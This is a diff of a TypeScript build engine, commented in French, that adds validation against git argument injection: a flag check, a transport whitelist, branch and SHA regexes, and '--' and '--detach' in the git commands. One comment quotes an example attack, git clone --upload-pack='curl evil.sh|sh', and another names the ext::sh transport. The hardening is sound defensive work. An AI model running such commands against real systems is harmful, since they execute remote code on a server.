@@ -133,6 +133,52 @@ export async function ensureCappedBuilder(
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
+// Injection d'ARGUMENT — distincte de l'injection shell
+// ─────────────────────────────────────────────────────────────────────────────
+
+/**
+ * `quoteArg` neutralise les métacaractères du shell. Il ne protège PAS contre
+ * l'injection d'argument : une valeur commençant par `-` reste un token argv
+ * distinct, que le programme lira comme un drapeau.
+ *
+ *     git clone --upload-pack='curl evil.sh|sh' ...
+ *
+ * `--upload-pack` fait exécuter une commande arbitraire par git. Aucun
+ * guillemet n'y change quoi que ce soit : le shell n'est pas en cause.
+ *
+ * Deux parades, appliquées ensemble :
+ *   1. refuser ici tout ce qui ressemble à un drapeau (défense en profondeur —
+ *      le moteur ne fait pas confiance à ses appelants, même si @noddle/shared
+ *      valide déjà à la frontière HTTP) ;
+ *   2. poser `--` avant les positionnels là où la commande le supporte.
+ */
+function assertNotFlag(value: string, label: string): void {
+  if (value.startsWith("-")) {
+    throw new BuildError(
+      "validation",
+      `${label} ne peut pas commencer par « - » : lu comme un drapeau par git`,
+      null
+    );
+  }
+}
+
+const SAFE_BRANCH = /^[A-Za-z0-9._/-]+$/;
+const SAFE_SHA = /^[0-9a-f]{7,40}$/;
+/**
+ * Liste blanche de transports git, et pas seulement un refus des drapeaux.
+ *
+ * `assertNotFlag` ne suffit pas ici : `ext::sh -c <commande>` est un transport
+ * git parfaitement valide qui EXÉCUTE la commande, et il ne commence pas par un
+ * tiret. Une liste noire raterait la prochaine variante ; on énumère donc ce
+ * qui est permis.
+ *
+ * `file://` est admis : transport inerte, utile pour un miroir local ou une
+ * installation coupée du réseau. `ext::`, `--upload-pack` et consorts sont hors
+ * de cette liste, donc refusés.
+ */
+const SAFE_REPO_URL = /^(https:\/\/|ssh:\/\/|file:\/\/|git@[\w.-]+:)/;
+
+// ─────────────────────────────────────────────────────────────────────────────
 // Récupération du code
 // ─────────────────────────────────────────────────────────────────────────────
 
@@ -148,6 +194,20 @@ export async function fetchSource(
   client: SshClient,
   o: CloneOptions
 ): Promise<string> {
+  // Le moteur revalide ce que @noddle/shared a déjà validé côté API. Un jour
+  // un appelant oubliera, et ce jour-là c'est une RCE sur le serveur du client.
+  assertNotFlag(o.repoUrl, "URL du dépôt");
+  assertNotFlag(o.branch, "nom de branche");
+  if (!SAFE_REPO_URL.test(o.repoUrl)) {
+    throw new BuildError("validation", "URL de dépôt refusée", null);
+  }
+  if (!SAFE_BRANCH.test(o.branch)) {
+    throw new BuildError("validation", "nom de branche refusé", null);
+  }
+  if (o.commitSha && !SAFE_SHA.test(o.commitSha)) {
+    throw new BuildError("validation", "SHA de commit refusé", null);
+  }
+
   check(
     "préparation du répertoire",
     await exec(
@@ -162,7 +222,19 @@ export async function fetchSource(
     "git clone",
     await execArgv(
       client,
-      ["git", "clone", "--depth", "1", "--branch", o.branch, o.repoUrl, o.dir],
+      [
+        "git",
+        "clone",
+        "--depth",
+        "1",
+        "--branch",
+        o.branch,
+        // Fin des options : tout ce qui suit est un positionnel, même si ça
+        // commence par un tiret.
+        "--",
+        o.repoUrl,
+        o.dir,
+      ],
       o
     )
   );
@@ -178,7 +250,15 @@ export async function fetchSource(
     );
     check(
       "git checkout",
-      await execArgv(client, ["git", "-C", o.dir, "checkout", o.commitSha], o)
+      await execArgv(
+        client,
+        // Pas de `-- <sha>` ici : en git, `checkout -- X` signifie « restaure le
+        // FICHIER X », pas « bascule sur le commit X ». C'est --detach qui
+        // lève l'ambiguïté, et la validation du SHA plus haut qui écarte le
+        // drapeau.
+        ["git", "-C", o.dir, "checkout", "--detach", o.commitSha],
+        o
+      )
     );
   }
 
